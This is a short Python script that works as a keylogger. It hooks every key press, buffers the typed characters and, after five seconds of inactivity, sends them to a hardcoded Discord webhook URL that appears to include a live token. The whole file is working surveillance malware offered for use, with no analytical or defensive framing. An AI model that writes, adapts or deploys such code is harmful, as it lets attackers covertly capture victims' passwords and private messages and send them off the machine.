import keyboard
import threading
import time
from discord_webhook import DiscordWebhook

result = ''
webhook_url = 'https://discord.com/api/webhooks/1326926146255716364/Uqu2yYD9ljKOdmSRVqbDc5v-sSfm4_OoMrtCMjdeYMDbc_zTZhTcLFte54blI7szcETg' #insert your webhook url here
idle_time = 5 #inactivity timer before sending the result
keystrokes = []
last_key_time = None
lock = threading.Lock()

def flush():
    global keystrokes
    if keystrokes:
        result = ''.join(keystrokes)
        print(f"Flushed: {result}")  # Debug output
        webhook = DiscordWebhook(url=webhook_url, content=result)
        keystrokes = []  #clear the keystrokes list for the next iteration
        response = webhook.execute()
        print(f"Webhook response: {response.status_code}")  # Debug webhook status

def check():
    global last_key_time
    while True:
        time.sleep(0.1)  #check every 100ms
        with lock:
            if last_key_time and time.time() - last_key_time >= idle_time:
                flush()
                last_key_time = None

def on_key_press(event):
    global keystrokes, last_key_time
    with lock:
        #only log characters
        if len(event.name) == 1 or event.name == 'space':
            keystrokes.append(' ' if event.name == 'space' else event.name)
            last_key_time = time.time()
            print(f"Logged: {keystrokes}")
        else:
            print(f"Ignored: {event.name}") 


thread = threading.Thread(target=check)
thread.daemon = True
thread.start()

keyboard.on_press(on_key_press)
keyboard.wait()
